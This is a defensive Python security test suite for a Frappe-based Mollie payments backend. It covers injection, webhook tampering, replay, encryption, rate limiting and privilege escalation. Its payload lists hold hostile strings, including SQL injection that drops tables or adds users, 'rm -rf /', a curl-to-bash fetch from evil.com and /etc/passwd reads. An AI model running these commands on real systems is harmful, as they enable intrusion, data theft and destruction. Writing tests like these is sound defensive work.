"""

Security Penetration Testing for Mollie Backend API
Tests system security against various attack vectors
"""

import base64
import hashlib
import hmac
import json
from datetime import datetime, timedelta
from unittest.mock import patch

import frappe

from verenigingen.tests.fixtures.enhanced_test_factory import EnhancedTestCase
from verenigingen.verenigingen_payments.core.compliance.financial_validator import (
    FinancialValidator,
)
from verenigingen.verenigingen_payments.core.security.mollie_security_manager import (
    MollieSecurityManager,
    SecurityException,
)


class TestSecurityPenetration(EnhancedTestCase):
    """
    Security penetration tests for Mollie Backend API

    Tests:
    - Authentication bypass attempts
    - Injection attacks (SQL, NoSQL, Command)
    - Webhook tampering and replay attacks
    - Encryption vulnerabilities
    - Rate limiting bypass
    - Privilege escalation
    - Data leakage prevention
    """

    # Fields this suite overwrites on the LIVE Mollie Settings single. The
    # setUpClass commit defeats the test runner's rollback, so without the
    # snapshot/restore below a run against a production site permanently
    # replaces real credentials with these dummies (happened on veg11,
    # 2026-06: profile_id "pfl_sec_test" + 45-char dummy test key broke the
    # settings page and the portal bank-account update).
    _OVERWRITTEN_FIELDS = (
        "test_mode",
        "test_secret_key",
        "profile_id",
        "enable_backend_api",
        "organization_access_token",
        "backend_webhook_secret",
        "testing_webhook_secret_key",
    )
    _PASSWORD_FIELDS = (
        "test_secret_key",
        "organization_access_token",
        "backend_webhook_secret",
        "testing_webhook_secret_key",
    )

    @classmethod
    def setUpClass(cls):
        """Set up security test environment"""
        super().setUpClass()

        # Mollie Settings is a Single DocType. Configure it for testing: test mode
        # requires test_secret_key + profile_id (validate_mollie_credentials).
        settings = frappe.get_single("Mollie Settings")

        # Snapshot the real values (decrypted for password fields) so
        # tearDownClass can put them back.
        cls._original_settings = {}
        for field in cls._OVERWRITTEN_FIELDS:
            if field in cls._PASSWORD_FIELDS:
                cls._original_settings[field] = settings.get_password(field, raise_exception=False)
            else:
                cls._original_settings[field] = settings.get(field)

        settings.test_mode = 1
        settings.test_secret_key = "test_sec_key_" + "x" * 32
        settings.profile_id = "pfl_sec_test"
        settings.enable_backend_api = 1
        # Backend API clients (Chargebacks/Settlements/ReconciliationEngine) require an
        # Organization Access Token, which is distinct from the regular test_secret_key.
        settings.organization_access_token = "access_sec_test_" + "x" * 32
        settings.backend_webhook_secret = "webhook_secret_123"
        # get_webhook_secret() resolves to THIS field (not backend_webhook_secret)
        # when test_mode=1 — required for MollieSecurityManager.validate_webhook_signature().
        settings.testing_webhook_secret_key = "webhook_secret_123"
        settings.flags.ignore_validate = True
        settings.save(ignore_permissions=True)
        frappe.db.commit()

    @classmethod
    def tearDownClass(cls):
        """Restore the Mollie Settings values this suite overwrote."""
        from frappe.utils.password import remove_encrypted_password

        settings = frappe.get_single("Mollie Settings")
        for field, value in cls._original_settings.items():
            settings.set(field, value)
        settings.flags.ignore_validate = True
        settings.save(ignore_permissions=True)
        # A falsy password is skipped by save (it would not overwrite the
        # dummy), so drop the stored secret explicitly when there was none.
        for field in cls._PASSWORD_FIELDS:
            if not cls._original_settings.get(field):
                remove_encrypted_password("Mollie Settings", "Mollie Settings", field)
        frappe.db.commit()
        super().tearDownClass()

    def setUp(self):
        """Set up test case"""
        super().setUp()
        # Mollie Settings is a Single; its doc name is "Mollie Settings".
        self.settings_name = "Mollie Settings"
        self.settings_doc = frappe.get_single("Mollie Settings")
        # MollieSecurityManager takes a settings doc.
        self.security_manager = MollieSecurityManager(self.settings_doc)

    def test_sql_injection_attempts(self):
        """Test protection against SQL injection attacks"""

        # Common SQL injection payloads
        sql_payloads = [
            "'; DROP TABLE tabMollie_Audit_Log; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM tabUser--",
            "1; UPDATE tabMollie_Settings SET secret_key='hacked'--",
            "' OR 1=1--",
            "'; EXEC xp_cmdshell('net user hack3r password /add')--",
        ]

        from verenigingen.verenigingen_payments.workflows.reconciliation_engine import ReconciliationEngine

        engine = ReconciliationEngine()

        for payload in sql_payloads:
            # Try to inject via various input points

            # Test 1: Via settlement ID
            with self.assertRaises((frappe.ValidationError, Exception)):
                engine.process_settlement(payload)

            # Test 2: Via search parameters
            try:
                results = frappe.db.sql(
                    """
                    SELECT name FROM `tabPayment Entry`
                    WHERE reference_no = %s
                    """,
                    (payload,),
                    as_dict=True,
                )
                # Should return empty, not error
                self.assertEqual(len(results), 0)
            except Exception as e:
                # Should handle gracefully
                self.assertNotIn("DROP", str(e))
                self.assertNotIn("UPDATE", str(e))

            # Test 3: Via doctype operations
            try:
                doc = frappe.new_doc("Mollie Audit Log")
                doc.event_type = payload
                doc.message = "Test"
                doc.insert()
                # Should escape properly
                self.assertEqual(doc.event_type, payload)
                doc.delete()
            except Exception:
                pass  # Expected for some payloads

        # Verify database integrity
        tables_exist = frappe.db.sql(
            """
            SELECT COUNT(*) as count
            FROM information_schema.tables
            WHERE table_schema = DATABASE()
            AND table_name = 'tabMollie Audit Log'
        """,
            as_dict=True,
        )

        self.assertEqual(tables_exist[0]["count"], 1, "Table was dropped!")

    def test_nosql_injection_attempts(self):
        """Test protection against NoSQL injection in JSON operations"""

        # NoSQL injection payloads
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "this.password == 'admin'"},
            {"__proto__": {"isAdmin": True}},
            {"constructor": {"prototype": {"isAdmin": True}}},
        ]

        for payload in nosql_payloads:
            # Test JSON field operations
            try:
                doc = frappe.new_doc("Mollie Audit Log")
                doc.event_type = "test"
                doc.message = "test"
                doc.details = json.dumps(payload)
                doc.insert()

                # Verify it's stored as string, not executed
                retrieved = frappe.get_doc("Mollie Audit Log", doc.name)
                details = json.loads(retrieved.details)

                # Should be stored as-is, not evaluated
                if isinstance(payload, dict) and "$ne" in payload:
                    self.assertIn("$ne", details)

                doc.delete()

            except Exception:
                pass  # Some payloads might fail validation

    def test_command_injection_attempts(self):
        """Test protection against command injection"""

        # Command injection payloads
        cmd_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "& net user",
            "`rm -rf /`",
            "$(curl evil.com/shell.sh | bash)",
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
        ]

        for payload in cmd_payloads:
            # Test in API operations
            # Mock justified: Infrastructure - external dependency, not the boundary under test
            with patch("subprocess.run") as mock_run:
                # Ensure no subprocess calls are made
                try:
                    # Simulate operations that might call external commands
                    self.security_manager.validate_api_key(payload)
                except Exception:
                    pass

                # No commands should be executed
                mock_run.assert_not_called()

    def test_webhook_tampering_protection(self):
        """Test protection against webhook tampering.

        Rewritten against the CURRENT API: WebhookValidator was dead code and
        has been removed (see core/security/__init__.py); the live path is
        MollieSecurityManager.validate_webhook_signature(), which raises
        SecurityException on any mismatch (constant-time hmac.compare_digest).
        """
        # Each rejected signature below deliberately triggers
        # MollieSecurityManager._create_security_alert() -> frappe.log_error();
        # that is the intended defense firing, not a swallowed bug.
        self.expectErrorLog("WEBHOOK_SIGNATURE_INVALID")

        valid_body = json.dumps(
            {
                "id": "tr_123",
                "amount": {"value": "100.00", "currency": "EUR"},
            }
        )
        valid_signature = hmac.new(
            b"webhook_secret_123", valid_body.encode("utf-8"), hashlib.sha256
        ).hexdigest()

        # Sanity: the valid signature over the valid body is accepted.
        self.assertTrue(self.security_manager.validate_webhook_signature(valid_body, valid_signature))

        # Test 1: Modified body — signature no longer matches.
        tampered_body = json.dumps(
            {
                "id": "tr_123",
                "amount": {"value": "10000.00", "currency": "EUR"},  # changed amount
            }
        )
        with self.assertRaises(SecurityException):
            self.security_manager.validate_webhook_signature(tampered_body, valid_signature)

        # Test 2: Signature reused against a different body.
        different_body = json.dumps(
            {
                "id": "tr_456",
                "amount": {"value": "100.00", "currency": "EUR"},
            }
        )
        with self.assertRaises(SecurityException):
            self.security_manager.validate_webhook_signature(different_body, valid_signature)

        # Test 3: Forged signature over the valid body.
        forged_signature = base64.b64encode(b"forged_signature").decode()
        with self.assertRaises(SecurityException):
            self.security_manager.validate_webhook_signature(valid_body, forged_signature)

    def test_replay_attack_prevention(self):
        """Test protection against replay attacks.

        Rewritten against the CURRENT API: replay prevention here is a
        timestamp window (_validate_webhook_timestamp, 5-minute tolerance)
        checked inside validate_webhook_signature — there is no separate
        processed-webhook store to mock.
        """
        # The stale-timestamp branch below deliberately triggers
        # _create_security_alert("WEBHOOK_REPLAY_ATTEMPT") -> frappe.log_error();
        # that is the intended defense firing, not a swallowed bug.
        self.expectErrorLog("WEBHOOK_REPLAY_ATTEMPT")

        webhook_body = json.dumps(
            {
                "id": "tr_replay_test",
                "amount": {"value": "500.00", "currency": "EUR"},
            }
        )
        signature = hmac.new(b"webhook_secret_123", webhook_body.encode("utf-8"), hashlib.sha256).hexdigest()

        # Use the site's own clock (frappe.utils.now_datetime), matching what
        # _validate_webhook_timestamp compares against — datetime.now() can be
        # in a different timezone than the site and produce a false "stale".
        from frappe.utils import now_datetime

        # A fresh timestamp is within the replay window and is accepted.
        fresh_timestamp = now_datetime().isoformat()
        self.assertTrue(
            self.security_manager.validate_webhook_signature(webhook_body, signature, fresh_timestamp)
        )

        # A stale timestamp (well past the 5-minute tolerance) is rejected —
        # this is the actual replay-attack defense in the current code.
        stale_timestamp = (now_datetime() - timedelta(hours=1)).isoformat()
        with self.assertRaises(SecurityException):
            self.security_manager.validate_webhook_signature(webhook_body, signature, stale_timestamp)

    def test_encryption_vulnerabilities(self):
        """Test for encryption vulnerabilities.

        Rewritten against the CURRENT API: encrypt_sensitive_data() /
        decrypt_sensitive_data() (Fernet/AES via MollieSecurityManager) and
        rotate_api_keys() (plural — Mollie has no automatic rotation, so this
        is an info-only no-op, not a real key swap).
        """
        # The tamper case below deliberately triggers
        # decrypt_sensitive_data()'s frappe.log_error("Decryption failed...")
        # (plus its audit-log-creation attempt outside a request context) —
        # that is the intended defense firing, not a swallowed bug.
        self.expectErrorLog("Decryption failed", "Failed to create audit log")

        # Test 1: Ensure proper nonce usage (Fernet embeds a random IV/token
        # per call) — encrypting the same plaintext twice must not produce
        # identical ciphertext.
        data = "sensitive_data"
        encrypted1 = self.security_manager.encrypt_sensitive_data(data)
        encrypted2 = self.security_manager.encrypt_sensitive_data(data)
        self.assertNotEqual(encrypted1, encrypted2, "IV/nonce reuse detected!")
        # Both still decrypt back to the original plaintext.
        self.assertEqual(self.security_manager.decrypt_sensitive_data(encrypted1), data)
        self.assertEqual(self.security_manager.decrypt_sensitive_data(encrypted2), data)

        # Test 2: Tampering with ciphertext must fail safely (Fernet verifies
        # an HMAC before returning plaintext), not silently return garbage.
        encrypted = self.security_manager.encrypt_sensitive_data("test_data")
        tampered = encrypted[:-2] + ("xx" if encrypted[-2:] != "xx" else "yy")
        with self.assertRaises(SecurityException):
            self.security_manager.decrypt_sensitive_data(tampered)

        # Test 3: "Key rotation" — Mollie has no automatic rotation API;
        # rotate_api_keys() must say so rather than silently pretending to
        # rotate a key that was never swapped.
        result = self.security_manager.rotate_api_keys()
        self.assertEqual(result["status"], "info")
        self.assertIn("manual", result["message"].lower())

    def test_rate_limiting_bypass_attempts(self):
        """Test resistance to rate limiting bypass attempts.

        Rewritten against the CURRENT API: rate_limiter no longer exports a
        'RateLimiter' class; the live primitive is TokenBucketRateLimiter.
        There is no header-based identification anywhere in this API, so
        header spoofing cannot bypass it by construction — the meaningful
        assertion is that the SAME endpoint key stays rate-limited after its
        burst is exhausted.
        """
        from verenigingen.verenigingen_payments.core.resilience.rate_limiter import (
            TokenBucketRateLimiter,
        )

        limiter = TokenBucketRateLimiter(max_tokens=5, refill_rate=0, refill_period=60)

        # Exhaust the burst capacity.
        for _ in range(5):
            self.assertTrue(limiter.acquire(wait=False))

        # Further requests must be denied — no refill within this window, and
        # there is no request-header input this call could use to bypass it.
        self.assertFalse(limiter.acquire(wait=False), "Rate limit bypassed after burst exhaustion!")
        self.assertEqual(limiter.total_denied, 1)

    def test_privilege_escalation_attempts(self):
        """Test protection against privilege escalation via the dashboard API.

        Rewritten: the original raw `UPDATE ... SET role=...` premise no
        longer applies (User has no 'role' column; roles are a child table).
        The real, still-live control is get_dashboard_data()'s
        @high_security_api decorator — a user holding only a bare (non
        role-profiled) "Employee" role must not be able to call it.
        """
        from verenigingen.verenigingen_payments.dashboards.financial_dashboard import (
            get_dashboard_data,
        )

        original_user = frappe.session.user
        try:
            if not frappe.db.exists("User", "test_user@example.com"):
                self.create_test_user(email="test_user@example.com", roles=["Employee"])
            else:
                # Ensure a bare Employee role (no elevated role profile).
                frappe.db.set_value(
                    "User", "test_user@example.com", "role_profile_name", None, update_modified=False
                )

            frappe.set_user("test_user@example.com")
            with self.assertRaises((frappe.PermissionError, Exception)):
                get_dashboard_data()
        finally:
            frappe.set_user(original_user)

    def test_input_validation_boundaries(self):
        """Test input validation with boundary/non-finite numeric values.

        Rewritten against the CURRENT API: FinancialValidator.validate_amount()
        no longer raises — it returns (is_valid, error_message). inf/-inf/nan
        must still be rejected as non-finite.
        """
        validator = FinancialValidator()

        for num in (float("inf"), float("-inf"), float("nan")):
            is_valid, error = validator.validate_amount(num)
            self.assertFalse(is_valid, f"Non-finite amount accepted: {num}")
            self.assertIn("finite", error)

        # Sanity: an ordinary amount is still accepted.
        is_valid, error = validator.validate_amount("100.00")
        self.assertTrue(is_valid, error)

    def test_session_security(self):
        """Test session security measures"""

        # Test 1: Session fixation prevention — a freshly generated session
        # hash must differ from any prior session. ``frappe.generate_hash``
        # is the actual primitive Frappe uses to mint session IDs, so we
        # exercise it directly rather than patching the LoginManager wrapper.
        old_session = frappe.session.sid if hasattr(frappe.session, "sid") else None
        new_session = frappe.generate_hash()
        self.assertNotEqual(old_session, new_session, "Session fixation vulnerability!")

        # Test 2: Session timeout — a session 25h old is past the 24h window.
        # No cache mocking needed: the assertion is a pure date comparison.
        from datetime import datetime, timedelta

        session_data = {
            "user": "test@example.com",
            "created_at": datetime.now() - timedelta(hours=25),
        }
        is_valid = datetime.now() - session_data["created_at"] < timedelta(hours=24)
        self.assertFalse(is_valid, "Expired session still valid!")

    def tearDown(self):
        """Clean up test data"""
        # Clean up test audit logs. Mollie Audit Log no longer has a reference_id
        # column (refactored away); match on the description text instead.
        frappe.db.delete("Mollie Audit Log", {"description": ["like", "%test%"]})
        frappe.db.commit()
        super().tearDown()
